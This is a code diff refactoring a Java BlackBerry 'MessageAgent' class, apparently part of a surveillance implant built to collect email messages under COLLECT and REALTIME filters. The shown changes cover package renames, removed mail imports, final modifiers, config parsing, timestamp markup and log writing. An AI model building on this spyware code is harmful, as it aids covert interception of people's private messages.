@@ -1,41 +1,18 @@
-package com.ht.rcs.blackberry.agent;
+package blackberry.agent;
 
-import java.io.ByteArrayOutputStream;
-import java.io.EOFException;
 import java.io.IOException;
 import java.util.Date;
 import java.util.Vector;
 
-import net.rim.blackberry.api.mail.Address;
-import net.rim.blackberry.api.mail.BodyPart;
-import net.rim.blackberry.api.mail.Folder;
-import net.rim.blackberry.api.mail.Message;
-import net.rim.blackberry.api.mail.MessagingException;
-import net.rim.blackberry.api.mail.MimeBodyPart;
-import net.rim.blackberry.api.mail.Multipart;
-import net.rim.blackberry.api.mail.ServiceConfiguration;
-import net.rim.blackberry.api.mail.Session;
-import net.rim.blackberry.api.mail.Store;
-import net.rim.blackberry.api.mail.TextBodyPart;
-import net.rim.blackberry.api.mail.Transport;
-import net.rim.blackberry.api.mail.event.FolderEvent;
-import net.rim.blackberry.api.mail.event.FolderListener;
-import net.rim.device.api.io.http.HttpDateParser;
-import net.rim.device.api.servicebook.ServiceBook;
-import net.rim.device.api.servicebook.ServiceRecord;
-import net.rim.device.api.util.DataBuffer;
-import net.rim.device.api.util.IntHashtable;
-
-import com.ht.rcs.blackberry.config.Keys;
-import com.ht.rcs.blackberry.log.Log;
-import com.ht.rcs.blackberry.log.LogType;
-import com.ht.rcs.blackberry.log.Markup;
-import com.ht.rcs.blackberry.utils.Check;
-import com.ht.rcs.blackberry.utils.DateTime;
-import com.ht.rcs.blackberry.utils.Debug;
-import com.ht.rcs.blackberry.utils.DebugLevel;
-import com.ht.rcs.blackberry.utils.Utils;
-import com.ht.rcs.blackberry.utils.WChar;
+import blackberry.config.Keys;
+import blackberry.log.Log;
+import blackberry.log.LogType;
+import blackberry.log.Markup;
+import blackberry.utils.Check;
+import blackberry.utils.Debug;
+import blackberry.utils.DebugLevel;
+import blackberry.utils.Utils;
+import blackberry.utils.WChar;
 
 /*
  * http://rcs-dev/trac/browser/RCSASP/deps/Common/ASP_Common.h
@@ -70,7 +47,7 @@ public class MessageAgent extends Agent {
     MailListener mailListener;
     Markup markup_date;
 
-    public MessageAgent(boolean agentStatus) {
+    public MessageAgent(final boolean agentStatus) {
         super(AGENT_MESSAGE, agentStatus, true, "MessageAgent");
 
         // #ifdef DBC
@@ -81,7 +58,7 @@ public class MessageAgent extends Agent {
         mailListener = new MailListener(this);
     }
 
-    protected MessageAgent(boolean agentStatus, byte[] confParams) {
+    protected MessageAgent(final boolean agentStatus, final byte[] confParams) {
         this(agentStatus);
         parse(confParams);
 
@@ -103,16 +80,16 @@ public class MessageAgent extends Agent {
 
     protected boolean parse(final byte[] conf) {
 
-        Vector tokens = tokenize(conf);
+        final Vector tokens = tokenize(conf);
         if (tokens == null) {
             //#debug
             debug.error("Cannot tokenize conf");
             return false;
         }
 
-        int size = tokens.size();
+        final int size = tokens.size();
         for (int i = 0; i < size; ++i) {
-            Prefix token = (Prefix) tokens.elementAt(i);
+            final Prefix token = (Prefix) tokens.elementAt(i);
 
             switch (token.type) {
             case Prefix.TYPE_IDENTIFICATION:
@@ -125,7 +102,7 @@ public class MessageAgent extends Agent {
             case Prefix.TYPE_FILTER:
                 // Filtro (sempre 2, uno COLLECT e uno REALTIME);
                 try {
-                    Filter filter = new Filter(conf, token.payloadStart,
+                    final Filter filter = new Filter(conf, token.payloadStart,
                             token.length);
                     if (filter.isValid()) {
                         switch (filter.classtype) {
@@ -154,13 +131,14 @@ public class MessageAgent extends Agent {
                     }
                     //#debug
                     debug.trace("Type 2: header valid: " + filter.isValid());
-                } catch (Exception e) {
+                } catch (final Exception e) {
                     //#debug
                     debug.error("Cannot filter" + e);
                 }
                 break;
 
             default:
+                //#debug
                 debug.error("Unknown type: " + token.type);
                 break;
             }
@@ -171,13 +149,13 @@ public class MessageAgent extends Agent {
         return true;
     }
 
-    private Vector tokenize(byte[] conf) {
-        Vector tokens = new Vector();
+    private Vector tokenize(final byte[] conf) {
+        final Vector tokens = new Vector();
         int offset = 0;
-        int length = conf.length;
+        final int length = conf.length;
 
         while (offset < length) {
-            Prefix token = new Prefix(conf, offset);
+            final Prefix token = new Prefix(conf, offset);
             if (!token.isValid()) {
 
                 return null;
@@ -205,24 +183,27 @@ public class MessageAgent extends Agent {
     long initMarkup() {
         long lastcheck = 0;
         if (markup_date.isMarkup() == false) {
+            //#debug
             debug.info("Il Markup non esiste, timestamp = 0 ");
             timestamp = 0;
-            Date date = new Date();
+            final Date date = new Date();
             firsttimestamp = date.getTime();
 
         } else {
             // serializzi la data date
+            //#debug
             debug.info("::::::::::::::::::::::::::::::::");
-            Date date = new Date();
+            final Date date = new Date();
             timestamp = date.getTime();
 
             byte[] deserialized;
+            //#debug
             debug.trace("Sto leggendo dal markup");
             try {
                 deserialized = markup_date.readMarkup();
                 lastcheck = Utils.byteArrayToLong(deserialized, 0);
 
-            } catch (IOException e) {
+            } catch (final IOException e) {
                 // TODO Auto-generated catch block
                 e.printStackTrace();
             }
@@ -232,12 +213,13 @@ public class MessageAgent extends Agent {
     }
 
     void updateMarkup() {
+        //#debug
         debug.trace("Sto scrivendo nel markup");
-        byte[] serialize = Utils.longToByteArray(timestamp);
+        final byte[] serialize = Utils.longToByteArray(timestamp);
         markup_date.writeMarkup(serialize);
     }
 
-    void createLog(byte[] additionalData, byte[] content) {
+    void createLog(final byte[] additionalData, final byte[] content) {
         log.createLog(additionalData);
         log.writeLog(content);
         log.close();
